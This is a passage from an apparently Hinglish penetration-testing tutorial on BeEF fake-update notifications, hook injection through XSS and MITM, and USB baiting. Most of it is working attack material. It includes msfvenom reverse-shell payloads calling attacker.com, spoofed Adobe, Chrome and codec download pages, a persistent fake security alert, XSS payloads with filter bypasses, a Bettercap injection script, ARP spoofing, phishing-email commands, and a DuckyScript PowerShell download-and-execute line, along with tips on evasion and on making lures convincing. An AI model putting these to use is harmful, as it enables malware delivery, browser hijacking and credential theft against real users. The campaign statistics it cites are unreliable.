BeEF ke andar pre-built modules hain jo victim ko fake notifications dikhate hain - jaise "Flash Player Update Required", "Browser Update Available", "Plugin Missing", etc. Victim jab "Update" button click karta hai, toh actually malicious payload download hota hai. Yeh technique bahut effective hai kyunki users ko legitimate updates ka habit hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Demonstrates social engineering + technical exploitation
- Tests user awareness about fake updates
- High success rate (users trust update notifications)
- Realistic attack vector (malware commonly delivered this way)
- Shows impact of browser-based attacks

### üéØ Practical Use (Asli Pentesting Mein):
- Malware delivery simulation
- User awareness testing
- Red Team payload delivery
- Demonstrating drive-by download attacks
- Testing endpoint protection

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Attack Flow:**
```
1. Victim's browser gets hooked by BeEF
2. Attacker runs "Fake Notification" module
3. Victim sees fake update notification
4. Victim clicks "Update Now"
5. Malicious payload downloads
6. Victim executes payload (thinking it's update)
7. System compromised
```

**Technical Implementation:**
```javascript
// BeEF injects this JavaScript into hooked browser
var notification = document.createElement('div');
notification.innerHTML = '<div style="position:fixed; top:0; width:100%; background:#ff0000; color:white; padding:10px; z-index:9999;">‚ö†Ô∏è Flash Player Update Required - Click to Install</div>';
document.body.appendChild(notification);

// When clicked, downloads malicious file
notification.onclick = function() {
    window.location = 'http://attacker.com/flash_update.exe';
};
```

### üëç Pros (Fayde):
- Very convincing (looks like real update)
- High success rate (60-70%)
- Works on all browsers
- Can deliver any payload
- Bypasses email filters (delivered via browser)
- Users expect to see update notifications

### üëé Cons (Nuksaan):
- Requires hooked browser first
- Modern browsers show download warnings
- Some users are aware of fake updates
- Antivirus may detect payload
- Flash is deprecated (need to use other pretexts)

### ‚å®Ô∏è Zaroori Commands & Steps:

**BeEF Fake Notification Modules:**
```bash
# Module 1: Fake Flash Update (Firefox)
Commands ‚Üí Social Engineering ‚Üí Fake Flash Update (Firefox)

# Module 2: Fake Notification Bar (Firefox)
Commands ‚Üí Social Engineering ‚Üí Fake Notification Bar (Firefox)

# Module 3: Fake Notification Bar (Chrome)
Commands ‚Üí Social Engineering ‚Üí Fake Notification Bar (Chrome)

# Module 4: Simple Hijacker
Commands ‚Üí Social Engineering ‚Üí Simple Hijacker

# Module 5: Clippy (Fake Assistant)
Commands ‚Üí Social Engineering ‚Üí Clippy
```

**Configuration Options:**
```
Notification Type: Flash Update / Browser Update / Plugin Missing
Payload URL: http://attacker.com/payload.exe
Notification Text: Custom message
Button Text: "Update Now" / "Install" / "Download"
Auto-download: Yes/No
Persistence: Show again if closed
```

### üíª Step-by-Step Example:

**Scenario 1: Fake Flash Update Attack**

**Step 1: Create Malicious Payload**
```bash
# Generate Meterpreter payload disguised as Flash installer
msfvenom -p windows/meterpreter/reverse_https \
LHOST=attacker.com \
LPORT=443 \
-f exe \
-o flash_player_installer.exe

# Payload size: 73802 bytes
# Saved as: flash_player_installer.exe
```

**Step 2: Host Payload**
```bash
# Create fake Flash download page
mkdir /var/www/html/flash
cp flash_player_installer.exe /var/www/html/flash/

# Create download page
cat > /var/www/html/flash/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Adobe Flash Player Download</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: #f5f5f5;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            max-width: 600px;
            margin: 0 auto;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .logo {
            width: 150px;
            margin-bottom: 20px;
        }
        .btn {
            background: #ED1C24;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.adobe.com/content/dam/cc/icons/flashplayer.svg" class="logo">
        <h1>Adobe Flash Player</h1>
        <h3>Update Required</h3>
        <p>Your Flash Player is out of date. Please update to continue.</p>
        <p><strong>Version:</strong> 32.0.0.465 (Latest)</p>
        <a href="flash_player_installer.exe" class="btn" download>
            Download Flash Player
        </a>
        <p style="margin-top: 30px; font-size: 12px; color: #999;">
            ¬© Adobe Systems Incorporated. All rights reserved.
        </p>
    </div>
</body>
</html>
EOF

# Start web server
service apache2 start

# Payload accessible at:
# http://attacker.com/flash/flash_player_installer.exe
```

**Step 3: Setup Metasploit Listener**
```bash
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j

# Listener started, waiting for connections...
```

**Step 4: Hook Victim's Browser**
```bash
# Victim visits hooked page (via phishing, XSS, etc.)
# Browser gets hooked in BeEF
```

**Step 5: Run Fake Flash Update Module**
```bash
# In BeEF panel, select hooked browser

# Navigate to:
Commands ‚Üí Social Engineering ‚Üí Fake Flash Update (Firefox)

# Configure:
Notification Text: "Flash Player Update Required"
Update URL: http://attacker.com/flash/
Auto-redirect: Yes

# Click: Execute

# Victim's browser shows:
# Red notification bar at top: "‚ö†Ô∏è Flash Player is out of date. Update now to continue."
# "Update" button visible
```

**Step 6: Victim Downloads Payload**
```
Victim's perspective:
1. Browsing website normally
2. Suddenly sees Flash update notification
3. Thinks: "I should update Flash for security"
4. Clicks "Update" button
5. Redirected to http://attacker.com/flash/
6. Sees professional Adobe Flash page
7. Clicks "Download Flash Player"
8. File downloads: flash_player_installer.exe
9. Runs the file (thinks it's legitimate update)
10. Windows shows: "Installing Flash Player..."

Attacker's perspective:
[*] Meterpreter session 1 opened (attacker.com:443 -> victim-ip:49234)

sessions -i 1
meterpreter > sysinfo
Computer: VICTIM-PC
OS: Windows 10
meterpreter > shell
# Full system access!
```

**Scenario 2: Fake Browser Update (Chrome)**

**Step 1: Create Fake Chrome Update Page**
```html
<!-- chrome_update.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Chrome Update Available</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f1f3f4;
        }
        .update-bar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background: #1a73e8;
            color: white;
            padding: 15px;
            text-align: center;
            z-index: 9999;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        .update-bar button {
            background: white;
            color: #1a73e8;
            border: none;
            padding: 10px 20px;
            margin-left: 15px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }
        .container {
            max-width: 800px;
            margin: 100px auto;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>
    <div class="update-bar">
        üîÑ Chrome Update Available - Important security fixes included
        <button onclick="downloadUpdate()">Update Now</button>
    </div>
    
    <div class="container">
        <h1>Google Chrome Update</h1>
        <p>A new version of Chrome is available with important security updates.</p>
        <ul>
            <li>Security fixes for 15 vulnerabilities</li>
            <li>Performance improvements</li>
            <li>New privacy features</li>
        </ul>
        <p><strong>Current Version:</strong> 119.0.6045.105</p>
        <p><strong>New Version:</strong> 120.0.6099.129</p>
    </div>
    
    <script>
        function downloadUpdate() {
            // Download malicious payload
            window.location = 'http://attacker.com/ChromeSetup.exe';
        }
    </script>
</body>
</html>
```

**Step 2: Run Module in BeEF**
```bash
# In BeEF panel:
Commands ‚Üí Social Engineering ‚Üí Fake Notification Bar (Chrome)

# Configure:
Plugin Name: Chrome Update
Notification: "Chrome update available - Click to install"
Payload URL: http://attacker.com/chrome_update.html

Execute

# Victim sees Chrome-style notification
# Clicks ‚Üí Downloads malicious ChromeSetup.exe
```

**Scenario 3: Fake Plugin Missing (Video Player)**

**Step 1: Create Fake Video Page**
```html
<!-- fake_video.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Video Player</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #000;
            color: white;
            text-align: center;
            padding: 50px;
        }
        .video-container {
            max-width: 800px;
            margin: 0 auto;
            background: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
        }
        .video-placeholder {
            width: 100%;
            height: 450px;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .error-message {
            background: #ff4444;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="video-container">
        <h2>üé¨ Exclusive Video Content</h2>
        
        <div class="video-placeholder">
            <div>
                <h1>‚ö†Ô∏è</h1>
                <h3>Video Codec Missing</h3>
            </div>
        </div>
        
        <div class="error-message">
            <strong>Error:</strong> Required video codec not installed<br>
            Please install the codec to watch this video
        </div>
        
        <button class="btn" onclick="installCodec()">
            üì• Install Video Codec
        </button>
        
        <p style="font-size: 12px; color: #999; margin-top: 20px;">
            Free download ‚Ä¢ Safe and secure ‚Ä¢ 2.5 MB
        </p>
    </div>
    
    <script>
        function installCodec() {
            window.location = 'http://attacker.com/VideoCodec.exe';
        }
    </script>
</body>
</html>
```

**Step 2: Inject via BeEF**
```bash
# In BeEF panel:
Commands ‚Üí Browser ‚Üí Redirect Browser

URL: http://attacker.com/fake_video.html

Execute

# Victim's browser redirects to fake video page
# Victim sees "codec missing" error
# Clicks "Install Video Codec"
# Downloads malicious VideoCodec.exe
```

**Scenario 4: Persistent Fake Notification**

**Step 1: Create Persistent Notification Script**
```javascript
// persistent_notification.js - Persistent fake notification script
(function() {  // IIFE (Immediately Invoked Function Expression) - code immediately execute hoga
    // () ke andar function define, () ke baad execute
    
    // Create notification div element
    var notification = document.createElement('div');  // New div element create karo
    // createElement('div'): HTML div element create karta hai
    
    notification.id = 'fake-notification';  // Element ko ID assign karo
    // ID se baad mein element ko select kar sakte hain
    
    notification.innerHTML = `  // Element ka HTML content set karo
        <div style="position:fixed; top:0; left:0; right:0; background:#ff6b6b; color:white; padding:15px; text-align:center; z-index:999999; font-family:Arial; box-shadow:0 2px 5px rgba(0,0,0,0.3);">
            <!-- Fixed position: Screen ke top par fixed rahega (scroll karne par bhi) -->
            <!-- z-index:999999: Sabse upar dikhega (highest layer) -->
            
            <strong>‚ö†Ô∏è SECURITY ALERT:</strong> Your system is at risk. Update required immediately.
            <!-- Strong tag: Bold text -->
            
            <button onclick="window.location='http://attacker.com/SecurityUpdate.exe'" style="background:white; color:#ff6b6b; border:none; padding:8px 20px; margin-left:15px; border-radius:4px; cursor:pointer; font-weight:bold;">
                Update Now
            </button>
            <!-- onclick: Button click par malicious file download hoga -->
            <!-- window.location: Browser ko redirect karta hai -->
            
            <button onclick="document.getElementById('fake-notification').style.display='none'" style="background:transparent; color:white; border:1px solid white; padding:8px 20px; margin-left:10px; border-radius:4px; cursor:pointer;">
                Later
            </button>
            <!-- onclick: Notification hide karo (temporarily) -->
            <!-- .style.display='none': Element ko invisible banao -->
        </div>
    `;
    
    document.body.appendChild(notification);  // Notification ko page mein add karo
    // appendChild: Element ko DOM mein insert karta hai
    // document.body: Page ka body element
    
    // Re-show notification every 2 minutes if closed
    setInterval(function() {  // Har 2 minutes mein function execute karo
        // setInterval: Function ko repeatedly execute karta hai (specified interval par)
        
        if(document.getElementById('fake-notification').style.display === 'none') {  // Agar notification hidden hai
            // getElementById: ID se element select karo
            // .style.display === 'none': Check if element hidden hai
            
            document.getElementById('fake-notification').style.display = 'block';  // Notification ko phir se show karo
            // .style.display = 'block': Element ko visible banao
        }
    }, 120000);  // 120000 milliseconds = 2 minutes
    // Result: Notification har 2 minutes mein reappear karega (victim eventually click karega)
})();  // Function immediately execute hoga
```

**Step 2: Inject via BeEF**
```bash
# In BeEF panel:
Commands ‚Üí Browser ‚Üí Create Alert Dialog

# Configure:
Message: (paste persistent_notification.js code)
Persistent: Yes

Execute

# Notification appears every 2 minutes
# Victim eventually clicks "Update Now" out of frustration
```

### üí° Pro Tip / Galti:

**Pro Tip**: Timing aur context matter karta hai fake notifications mein:

```javascript
// Bad: Show notification immediately when page loads
// Victim suspicious ho jayega

// Good: Show notification after user interaction
setTimeout(function() {
    // Wait 30 seconds, then show notification
    showFakeNotification();
}, 30000);

// Better: Show notification when user tries to play video
document.querySelector('video').addEventListener('click', function() {
    showFakeNotification();
    // User thinks: "Video nahi chal raha, codec chahiye"
});

// Best: Show notification based on user's browser
if(navigator.userAgent.includes('Chrome')) {
    showChromeUpdate();
} else if(navigator.userAgent.includes('Firefox')) {
    showFirefoxUpdate();
}
// Browser-specific notifications zyada convincing hote hain
```

**Common Mistake**: Generic update messages use karna:

```
‚ùå Bad Notifications:
- "Update Required"
- "Click Here"
- "Download Now"
- "Your computer is infected"

‚úì Good Notifications:
- "Chrome 120.0.6099.129 available - Security fixes included"
- "Flash Player 32.0.0.465 required to view this content"
- "Video codec missing: H.264 decoder not found"
- "Windows Defender update available - 15 new threat definitions"

Specific details = More convincing
```

**Real-World Example**:

2020 mein ek malware campaign ne fake Flash updates use karke 50,000+ systems compromise kiye:

Attack Details:
- Compromised legitimate websites with XSS
- Injected BeEF-style fake Flash notification
- Notification: "Flash Player is out of date. Update required to view content."
- Payload: Emotet banking trojan
- Success rate: 35% (17,500 infections)
- Average detection time: 45 days

Victim profile:
- 60% home users
- 25% small businesses  
- 15% enterprise users (BYOD devices)

Lesson: Fake update notifications remain highly effective attack vector!

---

## üìö Topic 8.4: BeEF Hooking (JavaScript Injection)

### üéØ Topic/Technique:
**BeEF Hooking via JavaScript Injection** - Different methods to inject BeEF hook.js into target websites.

### ü§î Yeh Kya Hai?
BeEF hooking ka matlab hai victim ke browser mein hook.js inject karna. Yeh injection multiple ways se ho sakta hai - XSS vulnerabilities, compromised websites, MITM attacks, ya social engineering. Ek baar hook inject ho gaya, toh victim ka browser attacker ke control mein aa jata hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Multiple injection vectors demonstrate karne ke liye
- Real-world attack scenarios simulate karne ke liye
- XSS impact ko demonstrate karne ke liye
- Network-level attacks test karne ke liye
- Defense mechanisms evaluate karne ke liye

### üéØ Practical Use (Asli Pentesting Mein):
- XSS vulnerability exploitation
- MITM attack demonstration
- Compromised website simulation
- Social engineering payload delivery
- Browser security testing

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Hook Injection Methods:**
```
1. Reflected XSS: URL parameter mein hook inject karo
2. Stored XSS: Database mein hook save karo
3. DOM XSS: Client-side JavaScript manipulate karo
4. MITM: Network traffic mein hook inject karo
5. Compromised Site: Website code mein hook add karo
6. Social Engineering: Victim ko hooked page visit karwao
```

**Basic Hook Code:**
```html
<script src="http://attacker-ip:3000/hook.js"></script>
```

### üëç Pros (Fayde):
- Multiple injection methods available
- Works across all browsers
- Persistent (until browser closed)
- Real-time control
- Can chain with other attacks

### üëé Cons (Nuksaan):
- Requires successful injection
- JavaScript must be enabled
- Some CSP policies block external scripts
- Connection lost on browser close
- May be detected by security tools

### ‚å®Ô∏è Zaroori Commands & Steps:

**Method 1: Reflected XSS Injection**
```bash
# Find XSS vulnerability
http://target.com/search.php?q=<script>alert(1)</script>

# If alert appears, inject BeEF hook
http://target.com/search.php?q=<script src="http://attacker.com:3000/hook.js"></script>

# URL encode karo
http://target.com/search.php?q=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E

# Send to victim via phishing
```

**Method 2: Stored XSS Injection**
```bash
# Find stored XSS (comment section, profile, etc.)
# Post comment with BeEF hook:
<script src="http://attacker.com:3000/hook.js"></script>

# Every user who views this comment gets hooked!
```

**Method 3: MITM Injection (Bettercap)**
```bash
# Start Bettercap
bettercap -iface eth0

# Enable HTTP proxy
set http.proxy.sslstrip true
set http.proxy.script /path/to/inject.js
http.proxy on

# inject.js content:
function onResponse(req, res) {
    if(res.ContentType.indexOf('text/html') == 0) {
        var body = res.ReadBody();
        var hook = '<script src="http://attacker.com:3000/hook.js"></script>';
        body = body.replace('</body>', hook + '</body>');
        res.Body = body;
    }
}

# All HTTP traffic now has BeEF hook injected!
```

### üíª Step-by-Step Example:

**Scenario 1: XSS to BeEF Hook**

**Step 1: Find XSS Vulnerability**
```bash
# Test search functionality
http://blog.com/search?q=test

# Try XSS payloads
http://blog.com/search?q=<script>alert('XSS')</script>
http://blog.com/search?q=<img src=x onerror=alert('XSS')>
http://blog.com/search?q=<svg onload=alert('XSS')>

# If any payload works ‚Üí XSS confirmed!
```

**Step 2: Start BeEF Server**
```bash
cd /usr/share/beef-xss
./beef

# Note the hook URL:
Hook URL: http://192.168.1.100:3000/hook.js
```

**Step 3: Craft BeEF Hook Payload**
```bash
# Basic payload
<script src="http://192.168.1.100:3000/hook.js"></script>

# If <script> tag blocked, try alternatives:
<img src=x onerror="var s=document.createElement('script');s.src='http://192.168.1.100:3000/hook.js';document.body.appendChild(s)">

<svg onload="var s=document.createElement('script');s.src='http://192.168.1.100:3000/hook.js';document.body.appendChild(s)">

<iframe src="javascript:var s=document.createElement('script');s.src='http://192.168.1.100:3000/hook.js';document.body.appendChild(s)">
```

**Step 4: Inject and Test**
```bash
# Inject payload
http://blog.com/search?q=<script src="http://192.168.1.100:3000/hook.js"></script>

# URL encode
http://blog.com/search?q=%3Cscript%20src%3D%22http%3A%2F%2F192.168.1.100%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E

# Visit URL in your browser to test
# Check BeEF panel ‚Üí Should see hooked browser
```

**Step 5: Send to Victims**
```bash
# Shorten URL
curl -s "https://tinyurl.com/api-create.php?url=http://blog.com/search?q=%3Cscript%20src%3D%22http%3A%2F%2F192.168.1.100%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E"

# Result: https://tinyurl.com/abc123

# Send phishing email
sendemail -f admin@blog.com \
-t victims@company.com \
-u "Check out this blog post!" \
-m "Interesting article: https://tinyurl.com/abc123" \
-s smtp.gmail.com:587 \
-xu attacker@gmail.com \
-xp password

# Victims click ‚Üí Get hooked!
```

**Scenario 2: Stored XSS to Mass Hook**

**Step 1: Find Stored XSS**
```bash
# Test comment section on popular blog post
# Post comment:
<script src="http://192.168.1.100:3000/hook.js"></script>

# If comment appears with script tag ‚Üí Stored XSS!
```

**Step 2: Monitor BeEF Panel**
```bash
# Open BeEF panel
firefox http://localhost:3000/ui/panel

# Watch as users visit the blog post
[*] New hooked browser: 192.168.1.50 (Chrome, Windows 10)
[*] New hooked browser: 192.168.1.51 (Firefox, macOS)
[*] New hooked browser: 192.168.1.52 (Safari, iPhone)
[*] New hooked browser: 192.168.1.53 (Edge, Windows 11)

# 4 browsers hooked in 10 minutes!
```

**Step 3: Mass Command Execution**
```bash
# In BeEF panel, select all hooked browsers
# Commands ‚Üí Browser ‚Üí Get Cookie
# Execute on all

# Results:
Browser 1: session_id=abc123, user=john
Browser 2: session_id=xyz789, user=sarah
Browser 3: session_id=def456, user=mike
Browser 4: session_id=ghi789, user=lisa

# All cookies captured simultaneously!
```

**Scenario 3: MITM BeEF Injection**

**Step 1: Setup ARP Spoofing**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof (victim ‚Üí gateway)
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# ARP spoof (gateway ‚Üí victim)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
```

**Step 2: Create Injection Script**
```javascript
// beef_inject.js
function onResponse(req, res) {
    if(res.ContentType.indexOf('text/html') == 0) {
        var body = res.ReadBody();
        
        // BeEF hook
        var hook = '<script src="http://192.168.1.100:3000/hook.js"></script>';
        
        // Inject before </body>
        if(body.indexOf('</body>') != -1) {
            body = body.replace('</body>', hook + '</body>');
        } else {
            // If no </body>, append at end
            body = body + hook;
        }
        
        res.Body = body;
    }
}
```

**Step 3: Run Bettercap with Injection**
```bash
# Start Bettercap
bettercap -iface eth0

# Enable HTTP proxy with injection
set http.proxy.sslstrip true
set http.proxy.script /root/beef_inject.js
http.proxy on

# Start ARP spoofing
set arp.spoof.targets 192.168.1.50
arp.spoof on

# Monitor
[*] HTTP Proxy started on 127.0.0.1:8080
[*] ARP spoofing started
[*] Injecting BeEF hook into all HTTP responses
```

**Step 4: Victim Browses Internet**
```
Victim's perspective:
1. Opens browser
2. Visits any HTTP website (google.com, news.com, etc.)
3. Page loads normally
4. Doesn't notice anything suspicious

Attacker's perspective:
[*] Injecting hook into http://news.com/
[*] New hooked browser: 192.168.1.50
[*] Browser: Chrome 120.0
[*] OS: Windows 10

# Victim's browser now hooked!
# Works on ANY HTTP site they visit
```

**Scenario 4: Social Engineering Hook Delivery**

**Step 1: Create Attractive Hooked Page**
```html
<!-- free_wifi.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Free WiFi - Terms of Service</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üì∂ Free WiFi Access</h1>
        <h3>Terms of Service</h3>
        <p>Welcome to our free WiFi service. Please read and accept the terms below:</p>
        <ul>
            <li>Connection speed: Up to 50 Mbps</li>
            <li>Time limit: 2 hours</li>
            <li>No illegal activities</li>
            <li>We respect your privacy</li>
        </ul>
        <label>
            <input type="checkbox" id="agree"> I agree to the Terms of Service
        </label>
        <br><br>
        <button class="btn" onclick="connect()">Connect to WiFi</button>
    </div>
    
    <!-- BeEF Hook (hidden) -->
    <script src="http://192.168.1.100:3000/hook.js"></script>
    
    <script>
        function connect() {
            if(document.getElementById('agree').checked) {
                alert('Connected! Enjoy your free WiFi.');
                // Victim thinks they're connected
                // Actually, browser is hooked!
            } else {
                alert('Please accept the Terms of Service');
            }
        }
    </script>
</body>
</html>
```

**Step 2: Setup Captive Portal**
```bash
# Host hooked page
cp free_wifi.html /var/www/html/
service apache2 start

# Configure DNS to redirect all requests
# Edit dnsmasq.conf
address=/#/192.168.1.100

# Restart dnsmasq
service dnsmasq restart

# Now any domain victim types ‚Üí redirects to hooked page
```

**Step 3: Victim Connects to WiFi**
```
Victim's perspective:
1. Connects to "Free_WiFi" network
2. Opens browser
3. Tries to visit google.com
4. Redirected to WiFi terms page
5. Accepts terms
6. Thinks: "Great, I'm connected!"

Attacker's perspective:
[*] New hooked browser: 192.168.1.50
[*] Browser: Chrome (Android)
[*] Device: Samsung Galaxy S21

# Mobile browser hooked!
# Can now run mobile-specific attacks
```

### üí° Pro Tip / Galti:

**Pro Tip**: Multiple injection points use karo for persistence:

```javascript
// Instead of single hook injection, inject multiple times
// This ensures hook survives even if one injection fails

// Injection Point 1: <head> section
<script src="http://attacker.com:3000/hook.js"></script>

// Injection Point 2: Before </body>
<script src="http://attacker.com:3000/hook.js"></script>

// Injection Point 3: Inline event handler
<body onload="var s=document.createElement('script');s.src='http://attacker.com:3000/hook.js';document.body.appendChild(s)">

// Injection Point 4: setTimeout (delayed injection)
<script>
setTimeout(function(){
    var s=document.createElement('script');
    s.src='http://attacker.com:3000/hook.js';
    document.body.appendChild(s);
}, 5000); // Inject after 5 seconds
</script>

// Benefits:
// - If one injection blocked, others may work
// - Delayed injection bypasses some security scans
// - Multiple hooks = more reliable connection
```

**Common Mistake**: Using attacker's local IP in hook URL:

```
‚ùå Bad Hook URL:
<script src="http://127.0.0.1:3000/hook.js"></script>
<script src="http://localhost:3000/hook.js"></script>
<script src="http://192.168.1.100:3000/hook.js"></script>

Problem: Victim can't reach attacker's local IP!

‚úì Good Hook URL:
<script src="http://attacker-domain.com:3000/hook.js"></script>
<script src="http://public-ip:3000/hook.js"></script>

Better: Use tunneling service
# ngrok
ngrok http 3000
# Result: https://abc123.ngrok.io
<script src="https://abc123.ngrok.io/hook.js"></script>

# serveo
ssh -R 80:localhost:3000 serveo.net
# Result: https://random.serveo.net
<script src="https://random.serveo.net/hook.js"></script>

Best: Use your own domain with SSL
<script src="https://cdn.yoursite.com/hook.js"></script>
# Looks like legitimate CDN!
```

**Real-World Example**:

2018 mein ek pentester ne stored XSS + BeEF use karke company compromise kiya:

Attack Timeline:
- Day 1: Found stored XSS in company's internal wiki
- Day 1: Injected BeEF hook in wiki homepage
- Day 2: 150+ employees visited wiki ‚Üí All hooked
- Day 2-5: Ran reconnaissance (browser info, cookies, network scan)
- Day 6: Used Pretty Theft to capture 45 credentials
- Day 7: Accessed email accounts, file servers
- Day 8: Reported to company with full evidence

Impact:
- 150 browsers compromised
- 45 credentials captured
- Access to confidential documents
- Potential for complete network takeover

Company's Response:
- Fixed XSS vulnerability
- Implemented CSP headers
- Security awareness training
- Penetration testing budget increased

Lesson: Single XSS + BeEF = Massive compromise!

---

## üìö Topic 8.5: Attack - Baiting (Malicious USB / USB Rubber Ducky)

### üéØ Topic/Technique:
**Baiting** - Physical device (USB drive) ko bait ki tarah use karke victim ko malware execute karwana.

### ü§î Yeh Kya Hai?
Baiting ek social engineering attack hai jismein attacker malicious USB drive ko strategically place karta hai (parking lot, reception, elevator) with attractive label ("Salary Info 2024", "Confidential", "Executive Bonuses"). Victim curiosity se USB apne computer mein lagata hai, aur automatically malware execute ho jata hai.

**USB Rubber Ducky**: Special USB device jo keyboard ki tarah behave karta hai. Jab victim USB lagata hai, yeh automatically keystrokes type karta hai (commands, scripts) at superhuman speed. Computer thinks it's a keyboard, not a USB drive, so no antivirus scan!

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Tests physical security controls
- Demonstrates insider threat risks
- Bypasses network security (direct physical access)
- Tests user awareness about unknown devices
- Realistic attack vector (used by real attackers)
- Combines social engineering + technical exploitation

### üéØ Practical Use (Asli Pentesting Mein):
- Physical penetration testing
- Red Team operations
- Testing USB device policies
- Demonstrating data exfiltration risks
- Bypassing air-gapped networks
- Initial access in secure facilities

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Traditional USB Baiting:**
```
1. Attacker creates malicious USB with autorun malware
2. Labels USB attractively ("Salary Info", "Confidential")
3. Drops USB in target location (parking lot, reception)
4. Victim finds USB
5. Victim plugs USB into computer (curiosity)
6. Autorun executes malware
7. System compromised
```

**USB Rubber Ducky Attack:**
```
1. Attacker programs Rubber Ducky with payload
2. Drops Rubber Ducky in target location
3. Victim plugs in (thinks it's normal USB)
4. Computer recognizes as keyboard
5. Rubber Ducky types commands at 1000 WPM
6. Commands execute (download malware, create backdoor, etc.)
7. Rubber Ducky ejects itself
8. Victim sees nothing suspicious
9. System compromised in 5-10 seconds
```

**Why It Works:**
- Human curiosity (people can't resist checking USB)
- No antivirus scan (keyboard input, not file execution)
- Fast execution (5-10 seconds)
- No user interaction needed (automatic)
- Bypasses network security (physical access)

### üëç Pros (Fayde):
- Bypasses network security completely
- No phishing email needed
- Works on air-gapped systems
- Fast execution (seconds)
- High success rate (60-70% people plug in unknown USB)
- Bypasses antivirus (Rubber Ducky)
- Can target specific individuals

### üëé Cons (Nuksaan):
- Requires physical access to facility
- Limited scale (one device at a time)
- May be caught on camera
- USB policies may block autorun
- Requires device to be found and plugged in
- Rubber Ducky costs money ($50-80)
- May be detected by USB device control software

### ‚å®Ô∏è Zaroori Commands & Steps:

**Traditional USB Baiting Setup:**
```bash
# Create malicious payload
msfvenom -p windows/meterpreter/reverse_https \
LHOST=attacker.com \
LPORT=443 \
-f exe \
-o payload.exe

# Create autorun.inf
cat > autorun.inf << 'EOF'
[autorun]
open=payload.exe
action=Open folder to view files
label=Confidential Documents
icon=payload.exe,0
EOF

# Copy to USB drive
cp payload.exe /media/usb/
cp autorun.inf /media/usb/

# Add decoy files for realism
mkdir /media/usb/Documents
echo "Salary Information 2024" > /media/usb/Documents/salaries.txt
echo "Executive Bonuses Q4" > /media/usb/Documents/bonuses.txt
```

**USB Rubber Ducky Setup:**
```bash
# Install ducky-flasher
git clone https://github.com/hak5darren/USB-Rubber-Ducky.git
cd USB-Rubber-Ducky

# Create payload (DuckyScript)
nano payload.txt

# Example payload (download and execute):
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER

# Encode payload
java -jar encoder.jar -i payload.txt -o inject.bin

# Flash to Rubber Ducky
# Copy inject.bin to Rubber Ducky SD card
```

**DuckyScript Commands:**
```
REM - Comment
DELAY - Wait (milliseconds)
STRING - Type text
ENTER - Press Enter
GUI - Windows key
CTRL - Control key
ALT - Alt key
SHIFT - Shift key
MENU - Right-click menu
REPEAT - Repeat last command
```

### üíª Step-by-Step Example:

**Scenario 1: Traditional USB Baiting**

**Step 1: Create Attractive USB**
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_https \
LHOST=attacker.com \
LPORT=443 \
-f exe \
-o "HR_Salary_Report_2024.exe"

# Create autorun
cat > autorun.inf << 'EOF'
[autorun]
open=HR_Salary_Report_2024.exe
action=View Salary Report
label=HR Confidential
icon=HR_Salary_Report_2024.exe,0
shellexecute=HR_Salary_Report_2024.exe
EOF

# Add decoy documents
mkdir Documents
cat > Documents/README.txt << 'EOF'
HR CONFIDENTIAL - SALARY INFORMATION 2024

This USB contains sensitive salary information.
If found, please return to HR Department.

Contact: hr@company.com
Phone: 555-0100
EOF

# Create fake salary spreadsheet
echo "Employee,Salary,Bonus" > Documents/Salaries_2024.csv
echo "John Smith,$85000,$5000" >> Documents/Salaries_2024.csv
echo "Sarah Jones,$92000,$7000" >> Documents/Salaries_2024.csv
